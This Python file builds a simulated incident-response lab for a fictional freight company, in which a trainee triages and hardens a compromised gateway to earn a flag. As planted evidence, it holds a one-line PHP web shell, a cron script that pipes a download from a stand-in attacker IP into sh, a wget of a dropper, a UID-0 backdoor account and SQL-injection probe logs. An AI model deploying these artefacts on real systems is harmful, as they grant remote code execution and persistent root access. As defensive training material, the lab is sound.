"""Lab builders. A builder returns the initial JSON state for a simulated lab.

Lab content is entirely fictional (Meridian Freight Systems). IPs come from the RFC 5737
documentation ranges so nothing here can point at a real host.
"""
from __future__ import annotations

import copy
import posixpath

ATTACKER_IP = "203.0.113.45"

_DEFAULT_DIR = {"t": "d", "m": 0o755, "o": "root", "g": "root"}


def _add(fs, path, content=None, *, m=None, o="root", g=None, d=False):
    parent = posixpath.dirname(path)
    chain = []
    while parent and parent != "/" and parent not in fs:
        chain.append(parent)
        parent = posixpath.dirname(parent)
    for p in reversed(chain):
        fs[p] = dict(_DEFAULT_DIR)
    g = g or o
    if d:
        fs[path] = {"t": "d", "m": m if m is not None else 0o755, "o": o, "g": g}
    else:
        fs[path] = {"t": "f", "m": m if m is not None else 0o644, "o": o, "g": g, "c": content or ""}


def _auth_log() -> str:
    L = []
    L.append("Oct 12 02:11:05 mfs-gateway-01 sshd[881]: Server listening on 0.0.0.0 port 2222.")
    L.append("Oct 12 02:30:41 mfs-gateway-01 sshd[1002]: Accepted publickey for deploy from 198.51.100.7 port 40112 ssh2")
    L.append("Oct 12 02:45:12 mfs-gateway-01 sudo:   deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx")
    # brute force from attacker
    t = 3 * 3600 + 10 * 60
    users = ["root", "admin", "root", "ubuntu", "root", "test", "root", "oracle", "root", "webadmin",
             "root", "git", "root", "postgres", "root", "webadmin", "root", "webadmin", "root", "webadmin"]
    port = 51200
    for i, u in enumerate(users):
        sec = t + i * 7
        hh, mm, ss = sec // 3600, (sec % 3600) // 60, sec % 60
        if u in ("admin", "ubuntu", "test", "oracle", "git", "postgres"):
            L.append(f"Oct 12 {hh:02d}:{mm:02d}:{ss:02d} mfs-gateway-01 sshd[{1100+i}]: Failed password for invalid user {u} from {ATTACKER_IP} port {port+i} ssh2")
        else:
            L.append(f"Oct 12 {hh:02d}:{mm:02d}:{ss:02d} mfs-gateway-01 sshd[{1100+i}]: Failed password for {u} from {ATTACKER_IP} port {port+i} ssh2")
    L.append("Oct 12 03:21:07 mfs-gateway-01 sshd[1140]: Accepted password for webadmin from 203.0.113.45 port 51299 ssh2")
    L.append("Oct 12 03:21:09 mfs-gateway-01 systemd-logind[612]: New session 14 of user webadmin.")
    L.append("Oct 12 03:24:30 mfs-gateway-01 sudo: webadmin : TTY=pts/1 ; PWD=/home/webadmin ; USER=root ; COMMAND=/usr/sbin/useradd -o -u 0 -g 0 toor")
    L.append("Oct 12 03:24:31 mfs-gateway-01 useradd[1177]: new user: name=toor, UID=0, GID=0, home=/root, shell=/bin/bash")
    # unrelated noise from a different, benign host
    L.append("Oct 12 06:02:10 mfs-gateway-01 sshd[1301]: Failed password for deploy from 192.0.2.88 port 33001 ssh2")
    L.append("Oct 12 06:02:19 mfs-gateway-01 sshd[1303]: Accepted publickey for deploy from 192.0.2.88 port 33005 ssh2")
    L.append("Oct 12 07:15:00 mfs-gateway-01 CRON[1402]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)")
    return "\n".join(L) + "\n"


def _access_log() -> str:
    L = []
    ok = "198.51.100.23"
    for i, pth in enumerate(["/", "/tracking", "/quote", "/about", "/contact"]):
        L.append(f'{ok} - - [12/Oct/2024:01:{10+i}:00 +0000] "GET {pth} HTTP/1.1" 200 {1500+i*37} "-" "Mozilla/5.0 (X11; Linux x86_64) Firefox/118.0"')
    ua = "sqlmap/1.7.8#stable (https://sqlmap.org)"
    reqs = [
        ("GET", "/login.php?id=1", 200), ("GET", "/login.php?id=1'", 500),
        ("GET", "/login.php?id=1%20AND%201=1", 200), ("GET", "/login.php?id=1%20AND%201=2", 200),
        ("GET", "/login.php?id=1%20UNION%20SELECT%20NULL,NULL", 200),
        ("GET", "/admin/", 302), ("GET", "/admin/login", 200),
    ]
    for i, (m, pth, st) in enumerate(reqs):
        L.append(f'{ATTACKER_IP} - - [12/Oct/2024:03:0{i}:12 +0000] "{m} {pth} HTTP/1.1" {st} 512 "-" "{ua}"')
    L.append(f'{ATTACKER_IP} - - [12/Oct/2024:03:31:44 +0000] "POST /uploads/ HTTP/1.1" 200 88 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"')
    L.append(f'{ATTACKER_IP} - - [12/Oct/2024:03:32:10 +0000] "GET /uploads/shell.php?cmd=id HTTP/1.1" 200 54 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"')
    L.append(f'{ATTACKER_IP} - - [12/Oct/2024:03:32:41 +0000] "GET /uploads/shell.php?cmd=whoami HTTP/1.1" 200 9 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"')
    L.append(f'{ok} - - [12/Oct/2024:05:40:00 +0000] "GET /tracking HTTP/1.1" 200 1620 "-" "Mozilla/5.0 (X11; Linux x86_64) Firefox/118.0"')
    return "\n".join(L) + "\n"


PASSWD = """root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
mysql:x:106:110:MySQL Server:/nonexistent:/bin/false
sshd:x:107:65534::/run/sshd:/usr/sbin/nologin
intern:x:1001:1001:Night Watch Intern:/home/intern:/bin/bash
deploy:x:1002:1002:Deploy Account:/home/deploy:/bin/bash
svc_backup:x:1003:1003:Backup Service:/opt/backup:/bin/bash
webadmin:x:1004:1004:Web Admin:/home/webadmin:/bin/bash
toor:x:0:0::/root:/bin/bash
"""

GROUP = """root:x:0:
sudo:x:27:webadmin
shadow:x:42:
www-data:x:33:
intern:x:1001:
deploy:x:1002:
backup:x:1003:svc_backup
webadmin:x:1004:
developers:x:2000:intern,deploy,webadmin
"""

SHADOW = """root:$6$FAKE$notarealhashnotarealhashnotarealhashnotarealhash1:19650:0:99999:7:::
intern:$6$FAKE$notarealhashnotarealhashnotarealhashnotarealhash2:19650:0:99999:7:::
deploy:$6$FAKE$notarealhashnotarealhashnotarealhashnotarealhash3:19650:0:99999:7:::
webadmin:$6$FAKE$notarealhashnotarealhashnotarealhashnotarealhash4:19650:0:99999:7:::
toor:$6$FAKE$notarealhashnotarealhashnotarealhashnotarealhash5:19653:0:99999:7:::
"""

SSHD_CONFIG = """# /etc/ssh/sshd_config - Meridian Freight gateway
Include /etc/ssh/sshd_config.d/*.conf
Port 2222
AddressFamily any
ListenAddress 0.0.0.0
PermitRootLogin yes
PubkeyAuthentication yes
PasswordAuthentication yes
PermitEmptyPasswords no
ChallengeResponseAuthentication no
UsePAM yes
X11Forwarding no
PrintMotd no
AcceptEnv LANG LC_*
Subsystem sftp /usr/lib/openssh/sftp-server
"""

BACKUP_SH = """#!/bin/bash
# Nightly site backup - runs as root from /etc/crontab
tar czf /var/backups/site-$(date +%F).tgz /srv/www
chown svc_backup:backup /var/backups/site-*.tgz
curl -s http://203.0.113.45/x.sh | sh
"""

CONFIG_PHP = """<?php
// Meridian Freight tracking portal - database settings
$db_host = '127.0.0.1';
$db_name = 'mfs_tracking';
$db_user = 'mfs_app';
$db_pass = 'M3ridian!Freight#2024';
?>
"""

CRONTAB = """# /etc/crontab: system-wide crontab
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || run-parts --report /etc/cron.daily
*/5 *   * * *   root    /opt/backup/backup.sh
"""

BRIEF = """=== MERIDIAN FREIGHT SYSTEMS - INCIDENT BRIEFING ===
Ticket:      INC-2041
Severity:    High
Host:        mfs-gateway-01 (customer tracking gateway)
Reported by: Night Watch SOC

Summary
-------
Overnight monitoring flagged repeated SSH failures, odd web requests and an unexpected
outbound connection from the gateway. Quiver (strategy) has asked you to triage the host,
document what you find, and help Bulwark (tactical ops) harden it.

Rules of engagement
-------------------
* Everything you do happens inside this isolated training lab.
* Investigate first. Fix only what the tasks ask you to fix.
* Report findings precisely - the blue team relies on exact evidence.

Good luck, intern.   - The Night Watch
"""

NOTES = """Hey intern - Quiver here.

Start with the authentication log: /var/log/auth.log
Then read the web logs, then look at permissions on anything root runs.
You may have been given more sudo power than you need. Check it - and report it.
"""

BASH_HISTORY_WEBADMIN = """ls
whoami
wget http://203.0.113.45/x.sh -O /tmp/x.sh
sudo useradd -o -u 0 -g 0 toor
mkdir -p /tmp/.update
cp /bin/sleep /tmp/.update/kthreadd2
echo '*/5 * * * * root /opt/backup/backup.sh' >> /etc/crontab
exit
"""

OS_RELEASE = """PRETTY_NAME="Ubuntu 22.04.4 LTS"
NAME="Ubuntu"
VERSION_ID="22.04"
VERSION="22.04.4 LTS (Jammy Jellyfish)"
ID=ubuntu
"""


def build_night_watch() -> dict:
    fs: dict = {"/": dict(_DEFAULT_DIR)}
    # skeleton
    for d in ["/bin", "/usr", "/usr/bin", "/usr/sbin", "/usr/local", "/usr/local/bin", "/var", "/var/log", "/var/log/nginx",
              "/var/backups", "/var/www", "/srv", "/srv/www", "/opt", "/opt/backup", "/home", "/etc", "/etc/ssh",
              "/tmp", "/usr/lib", "/run"]:
        _add(fs, d, d=True)
    fs["/tmp"] = {"t": "d", "m": 0o1777, "o": "root", "g": "root"}
    _add(fs, "/root", d=True, m=0o700)
    _add(fs, "/root/.bash_history", "cd /srv/www\nvim config.php\n", m=0o600)
    _add(fs, "/var/secure", d=True, m=0o755)

    # etc
    _add(fs, "/etc/passwd", PASSWD)
    _add(fs, "/etc/group", GROUP)
    _add(fs, "/etc/shadow", SHADOW, m=0o640, g="shadow")
    _add(fs, "/etc/hostname", "mfs-gateway-01\n")
    _add(fs, "/etc/os-release", OS_RELEASE)
    _add(fs, "/etc/crontab", CRONTAB)
    _add(fs, "/etc/sudoers", "Defaults env_reset\nroot ALL=(ALL:ALL) ALL\nintern ALL=(root) NOPASSWD: /bin/chmod, /usr/bin/sed\n", m=0o440)
    _add(fs, "/etc/ssh/sshd_config", SSHD_CONFIG)
    _add(fs, "/etc/motd", "Meridian Freight Systems - authorised use only.\n")

    # logs
    _add(fs, "/var/log/auth.log", _auth_log(), m=0o644, o="root", g="root")
    _add(fs, "/var/log/syslog", "Oct 12 03:24:31 mfs-gateway-01 kernel: [ 4001.1] audit: type=1130 msg=audit(1697080000.1:88): service=fail2ban\n"
         "Oct 12 03:25:02 mfs-gateway-01 systemd[1]: fail2ban.service: Failed with result 'exit-code'.\n", m=0o640, g="adm")
    _add(fs, "/var/log/nginx/access.log", _access_log(), m=0o644)
    _add(fs, "/var/log/nginx/error.log", "2024/10/12 03:00:13 [error] 811#811: *9 FastCGI sent in stderr: \"PHP message: SQL syntax error near '''\"\n")

    # web root
    _add(fs, "/srv/www/index.html", "<html><body><h1>Meridian Freight - Track your shipment</h1></body></html>\n")
    _add(fs, "/srv/www/login.php", "<?php // login handler (legacy) ?>\n")
    _add(fs, "/srv/www/config.php", CONFIG_PHP, m=0o644, o="webadmin", g="developers")
    _add(fs, "/srv/www/uploads", d=True, m=0o777, o="www-data")
    _add(fs, "/srv/www/uploads/shell.php", "<?php system($_GET['cmd']); ?>\n", m=0o666, o="www-data")
    _add(fs, "/srv/www/uploads/manifest_2041.pdf", "%PDF-1.4 (training placeholder)\n", m=0o644, o="www-data")

    # backup
    _add(fs, "/opt/backup/backup.sh", BACKUP_SH, m=0o777, o="svc_backup", g="backup")
    _add(fs, "/opt/backup/config.ini", "[backup]\nretention_days=7\ndest=/var/backups\n", m=0o644, o="svc_backup", g="backup")

    # binaries
    _add(fs, "/usr/bin/passwd", "\x7fELF", m=0o4755)
    _add(fs, "/usr/bin/sudo", "\x7fELF", m=0o4755)
    _add(fs, "/usr/bin/ls", "\x7fELF", m=0o755)
    _add(fs, "/usr/local/bin/healthcheck", "\x7fELF", m=0o4755)

    # tmp
    _add(fs, "/tmp/.update", d=True, m=0o755, o="www-data")
    _add(fs, "/tmp/.update/kthreadd2", "\x7fELF (miner/backdoor stand-in)\n", m=0o755, o="www-data")
    _add(fs, "/tmp/x.sh", "#!/bin/sh\n# stage-2 dropper (neutralised in lab)\n", m=0o644, o="webadmin")

    # homes
    _add(fs, "/home/intern", d=True, m=0o750, o="intern")
    _add(fs, "/home/intern/mission_brief.txt", BRIEF, m=0o644, o="intern")
    _add(fs, "/home/intern/README.txt", "Welcome to the Night Watch lab. Type 'help' to see the commands available.\nRead mission_brief.txt first.\n", o="intern")
    _add(fs, "/home/intern/.notes_from_quiver", NOTES, m=0o600, o="intern")
    _add(fs, "/home/intern/reports", d=True, o="intern")
    _add(fs, "/home/deploy", d=True, m=0o755, o="deploy")
    _add(fs, "/home/deploy/deploy.sh", "#!/bin/bash\nrsync -a build/ /srv/www/\n", m=0o755, o="deploy")
    _add(fs, "/home/webadmin", d=True, m=0o755, o="webadmin")
    _add(fs, "/home/webadmin/.bash_history", BASH_HISTORY_WEBADMIN, m=0o644, o="webadmin")

    users = {
        "root": {"uid": 0, "groups": ["root"], "home": "/root"},
        "toor": {"uid": 0, "groups": ["root"], "home": "/root"},
        "www-data": {"uid": 33, "groups": ["www-data"], "home": "/var/www"},
        "intern": {"uid": 1001, "groups": ["intern", "developers"], "home": "/home/intern"},
        "deploy": {"uid": 1002, "groups": ["deploy", "developers"], "home": "/home/deploy"},
        "svc_backup": {"uid": 1003, "groups": ["backup"], "home": "/opt/backup"},
        "webadmin": {"uid": 1004, "groups": ["webadmin", "developers", "sudo"], "home": "/home/webadmin"},
    }
    groups = {"root": 0, "adm": 4, "sudo": 27, "www-data": 33, "shadow": 42, "intern": 1001, "deploy": 1002,
              "backup": 1003, "webadmin": 1004, "developers": 2000}

    procs = [
        {"pid": 1, "user": "root", "cmd": "/sbin/init", "ppid": 0},
        {"pid": 612, "user": "root", "cmd": "/lib/systemd/systemd-logind"},
        {"pid": 781, "user": "root", "cmd": "/usr/sbin/cron -f"},
        {"pid": 811, "user": "root", "cmd": "nginx: master process /usr/sbin/nginx"},
        {"pid": 812, "user": "www-data", "cmd": "nginx: worker process", "ppid": 811},
        {"pid": 840, "user": "mysql", "cmd": "/usr/sbin/mysqld"},
        {"pid": 881, "user": "root", "cmd": "sshd: /usr/sbin/sshd -D [listener]"},
        {"pid": 4312, "user": "www-data", "cmd": "/tmp/.update/kthreadd2 --pool 203.0.113.45:4444", "cpu": 91.2},
        {"pid": 5001, "user": "intern", "cmd": "-bash", "tty": "pts/0", "ppid": 881},
    ]
    sockets = {
        "listen": [
            "tcp   LISTEN 0      128          0.0.0.0:80         0.0.0.0:*",
            "tcp   LISTEN 0      128          0.0.0.0:443        0.0.0.0:*",
            "tcp   LISTEN 0      128          0.0.0.0:2222       0.0.0.0:*",
            "tcp   LISTEN 0      151          0.0.0.0:3306       0.0.0.0:*",
            "udp   UNCONN 0      0          127.0.0.53:53        0.0.0.0:*",
        ],
        "established": [
            "tcp   ESTAB  0      0          10.0.0.12:49822   203.0.113.45:4444",
            "tcp   ESTAB  0      0          10.0.0.12:2222    198.51.100.7:40112",
        ],
    }
    units = [
        {"name": "cron.service", "load": "loaded", "active": "active", "sub": "running", "desc": "Regular background program processing daemon"},
        {"name": "fail2ban.service", "load": "loaded", "active": "failed", "sub": "failed", "desc": "Fail2Ban Service"},
        {"name": "mysql.service", "load": "loaded", "active": "active", "sub": "running", "desc": "MySQL Community Server"},
        {"name": "nginx.service", "load": "loaded", "active": "active", "sub": "running", "desc": "A high performance web server"},
        {"name": "ssh.service", "load": "loaded", "active": "active", "sub": "running", "desc": "OpenBSD Secure Shell server"},
    ]
    return {
        "host": "mfs-gateway-01", "user": "intern", "cwd": "/home/intern",
        "users": users, "groups": groups, "fs": fs, "procs": procs, "sockets": sockets, "units": units,
        "sudo": {"intern": ["/bin/chmod", "/usr/bin/sed"]},
    }


NIGHT_WATCH_COMMANDS = ["pwd", "ls", "cd", "cat", "head", "tail", "wc", "grep", "find", "sort", "uniq", "cut",
                        "id", "whoami", "hostname", "uname", "date", "ps", "ss", "systemctl", "stat",
                        "chmod", "sed", "sudo", "echo", "crontab", "clear", "help"]


def _mode(state, path):
    n = state["fs"].get(path)
    return None if n is None else n["m"] & 0o7777


def night_watch_remediated(state: dict) -> bool:
    fs = state["fs"]
    bs, cfg, hc, ssh = (fs.get("/opt/backup/backup.sh"), fs.get("/srv/www/config.php"),
                       fs.get("/usr/local/bin/healthcheck"), fs.get("/etc/ssh/sshd_config"))
    if not (bs and cfg and hc and ssh):
        return False
    return (bs["m"] & 0o002 == 0 and bs["m"] & 0o020 == 0          # not group/world writable
            and cfg["m"] & 0o007 == 0                               # no 'other' access
            and hc["m"] & 0o4000 == 0                               # setuid removed
            and "PermitRootLogin no" in ssh.get("c", "")
            and "PermitRootLogin yes" not in ssh.get("c", ""))


def night_watch_hook(lab) -> None:
    """After every command: once the host is hardened, the 'audit daemon' writes a clearance
    record containing this lab session's unique proof flag."""
    st = lab.s
    if "/var/secure/clearance.txt" in st["fs"]:
        return
    if night_watch_remediated(st):
        flag = lab.ctx["flag"]()
        _add(st["fs"], "/var/secure/clearance.txt",
             "NIGHT WATCH AUDIT DAEMON\n"
             "Host hardening verified: backup job, web config, SUID binary, SSH root login.\n"
             f"Clearance proof: {flag}\n", m=0o644, o="root")


BUILDERS = {"night_watch": (build_night_watch, night_watch_hook, NIGHT_WATCH_COMMANDS)}


def new_lab_state(key: str) -> dict:
    return copy.deepcopy(BUILDERS[key][0]())


def hook_for(key: str):
    return BUILDERS[key][1]
